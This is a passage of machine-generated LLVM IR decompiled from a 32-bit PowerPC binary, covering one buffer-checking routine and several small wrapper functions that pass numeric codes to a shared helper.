dec_label_pc_10007c40:                            ; preds = %dec_label_pc_10007c34, %dec_label_pc_10007c24, %dec_label_pc_10007c18
  %v0_10007c40 = load i32, i32* @r30, align 4
  %v1_10007c40 = sub i32 0, %v0_10007c40
  store i32 %v1_10007c40, i32* %r0.global-to-local, align 4
  %v0_10007c44 = load i32, i32* @r27, align 4
  %v1_10007c44 = load i32, i32* @r28, align 4
  %v2_10007c44 = inttoptr i32 %v1_10007c44 to i32*
  store i32 %v0_10007c44, i32* %v2_10007c44, align 4
  %v0_10007c48 = load i32, i32* %r0.global-to-local, align 4
  %v1_10007c48 = urem i32 %v0_10007c48, 4
  store i32 %v1_10007c48, i32* %r0.global-to-local, align 4
  %v3_10007c48 = icmp eq i32 %v1_10007c48, 0
  %v0_10007c60.pre = load i32, i32* @r29, align 4
  br i1 %v3_10007c48, label %dec_label_pc_10007c60, label %dec_label_pc_10007c50

dec_label_pc_10007c50:                            ; preds = %dec_label_pc_10007c40
  %v2_10007c50 = icmp ult i32 %v0_10007c60.pre, %v1_10007c48
  br i1 %v2_10007c50, label %dec_label_pc_10007ed4, label %dec_label_pc_10007c58

dec_label_pc_10007c58:                            ; preds = %dec_label_pc_10007c50
  %v2_10007c58 = sub i32 %v0_10007c60.pre, %v1_10007c48
  store i32 %v2_10007c58, i32* @r29, align 4
  %v0_10007c5c = load i32, i32* @r30, align 4
  %v2_10007c5c = add i32 %v0_10007c5c, %v1_10007c48
  store i32 %v2_10007c5c, i32* @r30, align 4
  br label %dec_label_pc_10007c60

dec_label_pc_10007c60:                            ; preds = %dec_label_pc_10007c40, %dec_label_pc_10007c58
  %v0_10007c60 = phi i32 [ %v2_10007c58, %dec_label_pc_10007c58 ], [ %v0_10007c60.pre, %dec_label_pc_10007c40 ]
  %v1_10007c68 = load i32, i32* @r24, align 4
  %v2_10007c68 = inttoptr i32 %v1_10007c68 to i32*
  store i32 -1, i32* %v2_10007c68, align 4
  %tmp29 = icmp ult i32 %v0_10007c60, 4
  br i1 %tmp29, label %dec_label_pc_10007ed4, label %dec_label_pc_10007c70

dec_label_pc_10007c70:                            ; preds = %dec_label_pc_10007c60
  %v0_10007c70 = load i32, i32* @r29, align 4
  %v1_10007c70 = add i32 %v0_10007c70, -4
  store i32 %v1_10007c70, i32* %r0.global-to-local, align 4
  %tmp30 = icmp ult i32 %v1_10007c70, 8
  br i1 %tmp30, label %dec_label_pc_10007ed4, label %dec_label_pc_10007c7c

dec_label_pc_10007c7c:                            ; preds = %dec_label_pc_10007c70
  %v1_10007c7c = add i32 %v0_10007c70, -12
  store i32 %v1_10007c7c, i32* %r0.global-to-local, align 4
  %v0_10007c80 = load i32, i32* @r30, align 4
  %v1_10007c80 = add i32 %v0_10007c80, 4
  store i32 %v1_10007c80, i32* %r25.global-to-local, align 4
  store i32 0, i32* %r28.global-to-local, align 4
  %v3_10007c8c = inttoptr i32 %v1_10007c80 to i32*
  store i32 %v0_10007c80, i32* %v3_10007c8c, align 4
  %v0_10007c90 = load i32, i32* %r28.global-to-local, align 4
  %v1_10007c90 = load i32, i32* %r25.global-to-local, align 4
  %v2_10007c90 = add i32 %v1_10007c90, 4
  %v3_10007c90 = inttoptr i32 %v2_10007c90 to i32*
  store i32 %v0_10007c90, i32* %v3_10007c90, align 4
  %tmp31 = icmp ult i32 %v1_10007c7c, 32
  br i1 %tmp31, label %dec_label_pc_10007ed4, label %dec_label_pc_10007c98

dec_label_pc_10007c98:                            ; preds = %dec_label_pc_10007c7c
  %v0_10007c98 = load i32, i32* @r29, align 4
  %v1_10007c98 = add i32 %v0_10007c98, -44
  %tmp32 = icmp ult i32 %v1_10007c98, 256
  br i1 %tmp32, label %dec_label_pc_10007ed4, label %dec_label_pc_10007ca4

dec_label_pc_10007ca4:                            ; preds = %dec_label_pc_10007c98
  %v0_10007ca4 = load i32, i32* @r30, align 4
  %v1_10007ca4 = add i32 %v0_10007ca4, 44
  store i32 %v1_10007ca4, i32* @r31, align 4
  %v0_10007ca8 = load i32, i32* @r23, align 4
  store i32 %v0_10007ca8, i32* @r4, align 4
  %v1_10007cb0 = add i32 %v0_10007ca4, 12
  store i32 %v1_10007cb0, i32* %r21.global-to-local, align 4
  store i32 %v1_10007ca4, i32* %r3.global-to-local, align 4
  store i32 268467388, i32* @lr, align 4
  %v3_10007cb8 = call i32 @function_10007418(i32 %v1_10007ca4, i32 %v0_10007ca8, i32 %v1_10007c98)
  %v0_10007cbc = load i32, i32* @r31, align 4
  %v1_10007cbc = load i32, i32* @r30, align 4
  %v2_10007cbc = add i32 %v1_10007cbc, 12
  %v3_10007cbc = inttoptr i32 %v2_10007cbc to i32*
  store i32 %v0_10007cbc, i32* %v3_10007cbc, align 4
  %v0_10007cc0 = load i32, i32* %r28.global-to-local, align 4
  %v1_10007cc0 = load i32, i32* %r21.global-to-local, align 4
  %v2_10007cc0 = add i32 %v1_10007cc0, 4
  %v3_10007cc0 = inttoptr i32 %v2_10007cc0 to i32*
  store i32 %v0_10007cc0, i32* %v3_10007cc0, align 4
  %v0_10007cc4 = load i32, i32* @r23, align 4
  store i32 %v0_10007cc4, i32* %r3.global-to-local, align 4
  %v0_10007cc8 = load i32, i32* @r30, align 4
  store i32 %v0_10007cc8, i32* @r4, align 4
  store i32 268467408, i32* @lr, align 4
  %v2_10007ccc = inttoptr i32 %v0_10007cc4 to i8*
  %v3_10007ccc = call i32 @function_1000ad10(i8* %v2_10007ccc)
  store i32 %v3_10007ccc, i32* %r3.global-to-local, align 4
  store i32 %v3_10007ccc, i32* %r22.global-to-local, align 4
  %v3_10007cd0 = icmp eq i32 %v3_10007ccc, 0
  br i1 %v3_10007cd0, label %dec_label_pc_10007d04, label %dec_label_pc_10007cd8

dec_label_pc_10007cd8:                            ; preds = %dec_label_pc_10007ca4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_10007ce0 = load i32, i32* @r26, align 4
  %v2_10007ce0 = add i32 %v1_10007ce0, 8
  %v3_10007ce0 = inttoptr i32 %v2_10007ce0 to i32*
  store i32 2, i32* %v3_10007ce0, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v0_10007ce8 = load i32, i32* @r31, align 4
  %v1_10007ce8 = load i32, i32* @r26, align 4
  %v2_10007ce8 = inttoptr i32 %v1_10007ce8 to i32*
  store i32 %v0_10007ce8, i32* %v2_10007ce8, align 4
  %v0_10007cec = load i32, i32* %r0.global-to-local, align 4
  %v1_10007cec = load i32, i32* @r26, align 4
  %v2_10007cec = add i32 %v1_10007cec, 12
  %v3_10007cec = inttoptr i32 %v2_10007cec to i32*
  store i32 %v0_10007cec, i32* %v3_10007cec, align 4
  %v0_10007cf0 = load i32, i32* %r25.global-to-local, align 4
  %v1_10007cf0 = load i32, i32* @r26, align 4
  %v2_10007cf0 = add i32 %v1_10007cf0, 16
  %v3_10007cf0 = inttoptr i32 %v2_10007cf0 to i32*
  store i32 %v0_10007cf0, i32* %v3_10007cf0, align 4
  %v0_10007cf4 = load i32, i32* %r21.global-to-local, align 4
  %v1_10007cf4 = load i32, i32* @r26, align 4
  %v2_10007cf4 = add i32 %v1_10007cf4, 4
  %v3_10007cf4 = inttoptr i32 %v2_10007cf4 to i32*
  store i32 %v0_10007cf4, i32* %v3_10007cf4, align 4
  %v0_10007cf8 = load i32, i32* @r26, align 4
  %v1_10007cf8 = load i32, i32* @r20, align 4
  %v2_10007cf8 = inttoptr i32 %v1_10007cf8 to i32*
  store i32 %v0_10007cf8, i32* %v2_10007cf8, align 4
  %v0_10007cfc = load i32, i32* %r28.global-to-local, align 4
  %v1_10007cfc = load i32, i32* @r24, align 4
  %v2_10007cfc = inttoptr i32 %v1_10007cfc to i32*
  store i32 %v0_10007cfc, i32* %v2_10007cfc, align 4
  br label %dec_label_pc_10007ed8

dec_label_pc_10007d04:                            ; preds = %dec_label_pc_10007ca4
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r29.global-to-local, align 4
  store i32 268467468, i32* @lr, align 4
  %v0_10007d08 = call i32 @function_1000b46c()
  store i32 ptrtoint (i32* @global_var_100103e0.261 to i32), i32* %r29.global-to-local, align 4
  %v2_10007d10 = ptrtoint i32* %stack_var_-116 to i32
  store i32 %v2_10007d10, i32* %r28.global-to-local, align 4
  store i32 %v2_10007d10, i32* @r3, align 4
  %v0_10007d24 = call i32 @function_10009200()
  store i32 ptrtoint (i32* @global_var_100103e0.261 to i32), i32* %r3.global-to-local, align 4
  %v0_10007d2c = call i32 @function_100091f8()
  %v3_10007d34 = load i32, i32* @global_var_100104c8.262, align 4
  store i32 %v3_10007d34, i32* %r29.global-to-local, align 4
  store i32 %v2_10007d10, i32* @r3, align 4
  %v0_10007d40 = call i32 @function_10009200()
  %v0_10007d48 = load i32, i32* @r23, align 4
  store i32 %v0_10007d48, i32* %r3.global-to-local, align 4
  %v2_10007d58 = ptrtoint i32* %stack_var_-120 to i32
  %v2_10007d5c = ptrtoint i32* %stack_var_-100 to i32
  %v0_10007d60 = load i32, i32* %r22.global-to-local, align 4
  store i32 268467568, i32* @lr, align 4
  %v6_10007d6c = inttoptr i32 %v0_10007d48 to i8*
  %v7_10007d6c = call i32 @function_1000add0(i8* %v6_10007d6c, i32 1, i32 %v3_10007d34, i32 ptrtoint (i32* @global_var_10012d4c.263 to i32), i32 %v2_10007d58, i32 %v2_10007d5c)
  store i32 %v7_10007d6c, i32* %r3.global-to-local, align 4
  %v1_10007d70 = icmp slt i32 %v7_10007d6c, 0
  br i1 %v1_10007d70, label %dec_label_pc_10007eb8, label %dec_label_pc_10007d78

dec_label_pc_10007d78:                            ; preds = %dec_label_pc_10007d04
  store i32 %tmp19, i32* %r11.global-to-local, align 4
  %v1_10007d80 = add i32 %tmp19, 4
  %v2_10007d84 = mul i32 %v0_10007d60, %v1_10007d80
  %v1_10007d88 = add i32 %v2_10007d84, 256
  %v1_10007d8c = load i32, i32* @r27, align 4
  %v3_10007d8c = icmp ugt i32 %v1_10007d88, %v1_10007d8c
  br i1 %v3_10007d8c, label %dec_label_pc_10007d94, label %dec_label_pc_10007db0

dec_label_pc_10007d94:                            ; preds = %dec_label_pc_10007d78
  %v3_10007d94 = load i32, i32* %stack_var_-100, align 4
  store i32 %v3_10007d94, i32* @r3, align 4
  store i32 268467612, i32* @lr, align 4
  %v0_10007d98 = call i32 @function_100081f8()
  %v3_10007d9c = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_10007d9c, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10007da4.264 to i32), i32* @lr, align 4
  %v0_10007da0 = call i32 @function_100081f8()
  store i32 34, i32* %r3.global-to-local, align 4
  %v0_10007da8 = load i32, i32* @r19, align 4
  %v1_10007da8 = load i32, i32* @r24, align 4
  %v2_10007da8 = inttoptr i32 %v1_10007da8 to i32*
  store i32 %v0_10007da8, i32* %v2_10007da8, align 4
  br label %dec_label_pc_10007ed8

dec_label_pc_10007db0:                            ; preds = %dec_label_pc_10007d78
  %v3_10007db0 = icmp eq i32 %v0_10007d60, 0
  br i1 %v3_10007db0, label %dec_label_pc_10007db0.dec_label_pc_10007e54_crit_edge, label %dec_label_pc_10007db8

dec_label_pc_10007db0.dec_label_pc_10007e54_crit_edge: ; preds = %dec_label_pc_10007db0
  %v0_10007e5c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10007e54

dec_label_pc_10007db8:                            ; preds = %dec_label_pc_10007db0
  %v2_10007db8 = mul i32 %v0_10007d60, %tmp19
  store i32 %v2_10007db8, i32* @r5, align 4
  %v0_10007dbc = load i32, i32* @r30, align 4
  %v1_10007dbc = add i32 %v0_10007dbc, 36
  store i32 %v1_10007dbc, i32* %r3.global-to-local, align 4
  %v0_10007dc0 = load i32, i32* @r31, align 4
  store i32 268467656, i32* @lr, align 4
  %v2_10007dc4 = call i32 @function_1000a960(i32 %v1_10007dbc, i32 %v0_10007dc0)
  store i32 %v2_10007dc4, i32* %r3.global-to-local, align 4
  store i32 %v2_10007db8, i32* %r0.global-to-local, align 4
  %v0_10007dd4 = load i32, i32* @r30, align 4
  %v1_10007dd4 = load i32, i32* @r31, align 4
  %v3_10007dd4 = add i32 %v1_10007dd4, %v2_10007db8
  %v4_10007dd4 = inttoptr i32 %v3_10007dd4 to i32*
  store i32 %v0_10007dd4, i32* %v4_10007dd4, align 4
  %v0_10007dd8 = load i32, i32* @r31, align 4
  %v1_10007dd8 = load i32, i32* %r0.global-to-local, align 4
  %v2_10007dd8 = add i32 %v1_10007dd8, %v0_10007dd8
  store i32 %v2_10007dd8, i32* @r25, align 4
  %v1_10007de0 = add i32 %v0_10007d60, -1
  store i32 %v1_10007de0, i32* %r11.global-to-local, align 4
  %v1_10007de4 = add i32 %v0_10007d60, 1
  %v2_10007de8 = icmp sgt i32 %v1_10007de0, -1
  store i32 %v1_10007de4, i32* %ctr.global-to-local, align 4
  br i1 %v2_10007de8, label %dec_label_pc_10007e18.preheader, label %dec_label_pc_10007df4

dec_label_pc_10007df4:                            ; preds = %dec_label_pc_10007db8
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 1, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10007e18.preheader

dec_label_pc_10007e18.preheader:                  ; preds = %dec_label_pc_10007df4, %dec_label_pc_10007db8
  %v0_10007e206 = phi i32 [ 1, %dec_label_pc_10007df4 ], [ %v1_10007de4, %dec_label_pc_10007db8 ]
  %v1_10007e183 = mul i32 %v1_10007de0, 4
  store i32 %v1_10007e183, i32* %r0.global-to-local, align 4
  %v2_10007e1c5 = add i32 %v2_10007dd8, %v1_10007e183
  %v1_10007e207 = add i32 %v0_10007e206, -1
  store i32 %v1_10007e207, i32* %ctr.global-to-local, align 4
  %v2_10007e208 = icmp eq i32 %v1_10007e207, 0
  br i1 %v2_10007e208, label %dec_label_pc_10007e24, label %dec_label_pc_10007e00

dec_label_pc_10007e00:                            ; preds = %dec_label_pc_10007e18.preheader, %dec_label_pc_10007e00.dec_label_pc_10007e00_crit_edge
  %v1_10007e14 = phi i32 [ %v2_10007e1c, %dec_label_pc_10007e00.dec_label_pc_10007e00_crit_edge ], [ %v2_10007e1c5, %dec_label_pc_10007e18.preheader ]
  %v0_10007e0c = phi i32 [ %v0_10007e0c.pre, %dec_label_pc_10007e00.dec_label_pc_10007e00_crit_edge ], [ %v0_10007dd8, %dec_label_pc_10007e18.preheader ]
  %v0_10007e04 = phi i32 [ %v0_10007e18, %dec_label_pc_10007e00.dec_label_pc_10007e00_crit_edge ], [ %v1_10007de0, %dec_label_pc_10007e18.preheader ]
  %v2_10007e04 = mul i32 %v0_10007e04, %tmp19
  %v1_10007e08 = add i32 %v0_10007e04, -1
  store i32 %v1_10007e08, i32* %r11.global-to-local, align 4
  %v2_10007e0c = add i32 %v0_10007e0c, -8
  %v1_10007e10 = add i32 %v2_10007e0c, %v2_10007e04
  %v2_10007e14 = add i32 %v1_10007e14, 4
  %v3_10007e14 = inttoptr i32 %v2_10007e14 to i32*
  store i32 %v1_10007e10, i32* %v3_10007e14, align 4
  %v0_10007e18 = load i32, i32* %r11.global-to-local, align 4
  %v1_10007e18 = mul i32 %v0_10007e18, 4
  store i32 %v1_10007e18, i32* %r0.global-to-local, align 4
  %v1_10007e1c = load i32, i32* @r25, align 4
  %v0_10007e20 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10007e20 = add i32 %v0_10007e20, -1
  store i32 %v1_10007e20, i32* %ctr.global-to-local, align 4
  %v2_10007e20 = icmp eq i32 %v1_10007e20, 0
  br i1 %v2_10007e20, label %dec_label_pc_10007e24, label %dec_label_pc_10007e00.dec_label_pc_10007e00_crit_edge

dec_label_pc_10007e00.dec_label_pc_10007e00_crit_edge: ; preds = %dec_label_pc_10007e00
  %v2_10007e1c = add i32 %v1_10007e1c, %v1_10007e18
  %v0_10007e0c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10007e00

dec_label_pc_10007e24:                            ; preds = %dec_label_pc_10007e00, %dec_label_pc_10007e18.preheader
  %v1_10007e30 = phi i32 [ %v2_10007dd8, %dec_label_pc_10007e18.preheader ], [ %v1_10007e1c, %dec_label_pc_10007e00 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_10007e2c = mul i32 %v0_10007d60, 4
  %v2_10007e30 = add i32 %v1_10007e2c, 4
  %v2_10007e34 = add i32 %v2_10007e30, %v1_10007e30
  %v3_10007e34 = inttoptr i32 %v2_10007e34 to i32*
  store i32 0, i32* %v3_10007e34, align 4
  %v0_10007e40 = load i32, i32* @r25, align 4
  %v2_10007e40 = add i32 %v0_10007e40, %v1_10007e2c
  store i32 %v2_10007e40, i32* %r11.global-to-local, align 4
  %v1_10007e44 = load i32, i32* @r31, align 4
  %v2_10007e44 = sub i32 %v1_10007e44, %v2_10007e40
  %v1_10007e48 = add i32 %v2_10007e40, 8
  store i32 %v1_10007e48, i32* @r31, align 4
  %v0_10007e4c = load i32, i32* @r27, align 4
  %v2_10007e4c = add i32 %v0_10007e4c, %v2_10007e44
  %v1_10007e50 = add i32 %v2_10007e4c, -8
  br label %dec_label_pc_10007e54

dec_label_pc_10007e54:                            ; preds = %dec_label_pc_10007db0.dec_label_pc_10007e54_crit_edge, %dec_label_pc_10007e24
  %v0_10007e5c = phi i32 [ %v0_10007e5c.pre, %dec_label_pc_10007db0.dec_label_pc_10007e54_crit_edge ], [ %v1_10007e48, %dec_label_pc_10007e24 ]
  %v0_10007e58 = phi i32 [ %v1_10007d8c, %dec_label_pc_10007db0.dec_label_pc_10007e54_crit_edge ], [ %v1_10007e50, %dec_label_pc_10007e24 ]
  %v3_10007e54 = load i32, i32* %stack_var_-100, align 4
  store i32 %v3_10007e54, i32* @r4, align 4
  store i32 %v0_10007e5c, i32* %r3.global-to-local, align 4
  store i32 268467812, i32* @lr, align 4
  %v3_10007e60 = call i32 @function_10007418(i32 %v0_10007e5c, i32 %v3_10007e54, i32 %v0_10007e58)
  %v3_10007e64 = load i32, i32* %stack_var_-100, align 4
  store i32 %v3_10007e64, i32* @r3, align 4
  store i32 268467820, i32* @lr, align 4
  %v0_10007e68 = call i32 @function_100081f8()
  store i32 %v0_10007e68, i32* %r3.global-to-local, align 4
  store i32 %tmp18, i32* %r0.global-to-local, align 4
  %v3_10007e70 = icmp eq i32 %tmp18, 1
  br i1 %v3_10007e70, label %dec_label_pc_10007e78, label %dec_label_pc_10007ec0

dec_label_pc_10007e78:                            ; preds = %dec_label_pc_10007e54
  store i32 4, i32* @r5, align 4
  %v0_10007e80 = load i32, i32* @r30, align 4
  store i32 %v0_10007e80, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10007e88.265 to i32), i32* @lr, align 4
  %v0_10007e84 = call i32 @function_10007108()
  %v1_10007e8c = load i32, i32* @r26, align 4
  %v2_10007e8c = add i32 %v1_10007e8c, 8
  %v3_10007e8c = inttoptr i32 %v2_10007e8c to i32*
  store i32 2, i32* %v3_10007e8c, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_10007e94 = load i32, i32* @r26, align 4
  %v2_10007e94 = add i32 %v1_10007e94, 12
  %v3_10007e94 = inttoptr i32 %v2_10007e94 to i32*
  store i32 4, i32* %v3_10007e94, align 4
  %v0_10007e98 = load i32, i32* @r31, align 4
  %v1_10007e98 = load i32, i32* @r26, align 4
  %v2_10007e98 = inttoptr i32 %v1_10007e98 to i32*
  store i32 %v0_10007e98, i32* %v2_10007e98, align 4
  %v0_10007e9c = load i32, i32* @r25, align 4
  %v1_10007e9c = load i32, i32* @r26, align 4
  %v2_10007e9c = add i32 %v1_10007e9c, 16
  %v3_10007e9c = inttoptr i32 %v2_10007e9c to i32*
  store i32 %v0_10007e9c, i32* %v3_10007e9c, align 4
  %v0_10007ea0 = load i32, i32* @r21, align 4
  %v1_10007ea0 = load i32, i32* @r26, align 4
  %v2_10007ea0 = add i32 %v1_10007ea0, 4
  %v3_10007ea0 = inttoptr i32 %v2_10007ea0 to i32*
  store i32 %v0_10007ea0, i32* %v3_10007ea0, align 4
  %v3_10007ea4 = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_10007ea4, i32* @r3, align 4
  store i32 268467884, i32* @lr, align 4
  %v0_10007ea8 = call i32 @function_100081f8()
  store i32 %v0_10007ea8, i32* %r3.global-to-local, align 4
  %v0_10007eac = load i32, i32* @r26, align 4
  %v1_10007eac = load i32, i32* @r20, align 4
  %v2_10007eac = inttoptr i32 %v1_10007eac to i32*
  store i32 %v0_10007eac, i32* %v2_10007eac, align 4
  br label %dec_label_pc_10007eb8

dec_label_pc_10007eb8:                            ; preds = %dec_label_pc_10007ec0, %dec_label_pc_10007d04, %dec_label_pc_10007e78
  %storemerge1 = phi i32 [ 0, %dec_label_pc_10007e78 ], [ 2, %dec_label_pc_10007d04 ], [ 2, %dec_label_pc_10007ec0 ]
  %storemerge = phi i32 [ 0, %dec_label_pc_10007e78 ], [ 1, %dec_label_pc_10007d04 ], [ 1, %dec_label_pc_10007ec0 ]
  store i32 %storemerge1, i32* %r3.global-to-local, align 4
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v1_10007eb8 = load i32, i32* @r24, align 4
  %v2_10007eb8 = inttoptr i32 %v1_10007eb8 to i32*
  store i32 %storemerge, i32* %v2_10007eb8, align 4
  br label %dec_label_pc_10007ed8

dec_label_pc_10007ec0:                            ; preds = %dec_label_pc_10007e54
  %v3_10007ec0 = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_10007ec0, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10007ec8.266 to i32), i32* @lr, align 4
  %v0_10007ec4 = call i32 @function_100081f8()
  store i32 %v0_10007ec4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10007eb8

dec_label_pc_10007ed4:                            ; preds = %dec_label_pc_10007c98, %dec_label_pc_10007c7c, %dec_label_pc_10007c70, %dec_label_pc_10007c60, %dec_label_pc_10007c50
  store i32 34, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10007ed8

dec_label_pc_10007ed8:                            ; preds = %dec_label_pc_10007c34, %dec_label_pc_10007c2c, %dec_label_pc_10007be0, %dec_label_pc_10007ba8, %dec_label_pc_10007eb8, %dec_label_pc_10007d94, %dec_label_pc_10007cd8, %dec_label_pc_10007ed4
  store i32 %v0_10007bac, i32* %r0.global-to-local, align 4
  %v0_10007ee8 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10007ee8

; uselistorder directives
  uselistorder i32 %v0_10007e5c, { 1, 0 }
  uselistorder i32 %v1_10007e2c, { 1, 0 }
  uselistorder i32 %v1_10007e20, { 1, 0 }
  uselistorder i32 %v1_10007e18, { 1, 0 }
  uselistorder i32 %v0_10007e04, { 1, 0 }
  uselistorder i32 %v1_10007e183, { 1, 0 }
  uselistorder i32 %v1_10007de0, { 1, 0, 2, 3 }
  uselistorder i32 %v2_10007dd8, { 1, 0, 2 }
  uselistorder i32 %v0_10007d60, { 0, 5, 4, 1, 3, 2 }
  uselistorder i32 %v1_10007ca4, { 1, 0, 2 }
  uselistorder i32 %v0_10007c60.pre, { 0, 2, 1 }
  uselistorder i32 %v1_10007c48, { 4, 3, 2, 1, 0 }
  uselistorder i32 %tmp19, { 0, 1, 3, 2 }
  uselistorder i32 %tmp18, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 20, 3, 4, 1, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 2, 18, 19, 21, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 0, 2, 3, 4, 5, 18, 8, 6, 7, 9, 10, 11, 12, 13, 15, 16, 14, 17, 19 }
  uselistorder i32* %ctr.global-to-local, { 0, 3, 4, 1, 2 }
  uselistorder label %dec_label_pc_10007ed8, { 7, 4, 5, 6, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_10007eb8, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10007e54, { 1, 0 }
  uselistorder label %dec_label_pc_10007e00, { 1, 0 }
  uselistorder label %dec_label_pc_10007c60, { 1, 0 }
}

define i32 @function_10007eec(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10007eec:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_10007f00 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268467984, i32* @lr, align 4
  %v2_10007f0c = call i32 @function_10009560(i32 5, i32 %v2_10007f00)
  ret i32 %v2_10007f0c

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @function_10007f20(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10007f20:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_10007f34 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268468036, i32* @lr, align 4
  %v2_10007f40 = call i32 @function_10009560(i32 2, i32 %v2_10007f34)
  ret i32 %v2_10007f40

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @function_10007f54(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10007f54:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_10007f68 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268468088, i32* @lr, align 4
  %v2_10007f74 = call i32 @function_10009560(i32 3, i32 %v2_10007f68)
  ret i32 %v2_10007f74

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @function_10007f88(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10007f88:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_10007f9c = ptrtoint i32* %stack_var_-24 to i32
  store i32 268468136, i32* @lr, align 4
  %v2_10007fa4 = call i32 @function_10009560(i32 4, i32 %v2_10007f9c)
  ret i32 %v2_10007fa4

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @function_10007fb8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10007fb8:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_10007fcc = ptrtoint i32* %stack_var_-24 to i32
  store i32 268468192, i32* @lr, align 4
  %v2_10007fdc = call i32 @function_10009560(i32 10, i32 %v2_10007fcc)
  ret i32 %v2_10007fdc

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @function_10007ff0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_10007ff0:
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-40, align 4
  %v2_10008004 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268468256, i32* @lr, align 4
  %v2_1000801c = call i32 @function_10009560(i32 11, i32 %v2_10008004)
  ret i32 %v2_1000801c

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
}

define i32 @function_10008030(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_10008030:
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-40, align 4
  %v2_10008044 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268468316, i32* @lr, align 4
  %v2_10008058 = call i32 @function_10009560(i32 14, i32 %v2_10008044)
  ret i32 %v2_10008058

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
}

define i32 @function_1000806c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000806c:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_10008080 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268468368, i32* @lr, align 4
  %v2_1000808c = call i32 @function_10009560(i32 1, i32 %v2_10008080)
  ret i32 %v2_1000808c

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @function_100080a0() local_unnamed_addr {
dec_label_pc_100080a0:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_100080a0 = load i32, i32* @r3, align 4
  %v3_100080a0 = icmp eq i32 %v0_100080a0, 0
  br i1 %v3_100080a0, label %dec_label_pc_100080b8, label %dec_label_pc_100080bc

dec_label_pc_100080b8:                            ; preds = %dec_label_pc_100080a0
  br label %dec_label_pc_100080bc

dec_label_pc_100080bc:                            ; preds = %dec_label_pc_100080a0, %dec_label_pc_100080b8
  %v0_100080cc = phi i32 [ 1, %dec_label_pc_100080b8 ], [ %v0_100080a0, %dec_label_pc_100080a0 ]
  %v3_100080c0 = icmp ugt i32 %v0_100080cc, -8
  br i1 %v3_100080c0, label %dec_label_pc_100081d0, label %dec_label_pc_100080c8

dec_label_pc_100080c8:                            ; preds = %dec_label_pc_100080bc
  %v1_100080cc = add i32 %v0_100080cc, 4
  store i32 ptrtoint (i32* @global_var_10012af4.267 to i32), i32* @r29, align 4
  store i32 %v1_100080cc, i32* %stack_var_-40, align 4
  %v0_100080dc = call i32 @function_100091f8()
  %v2_100080e4 = ptrtoint i32* %stack_var_-40 to i32
  %v3_100080ec = call i32 @function_10008428(i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32 1088) to i32*), i32 %v2_100080e4)
  store i32 %v3_100080ec, i32* %r31.global-to-local, align 4
  %v0_100080f8 = call i32 @function_100091f8()
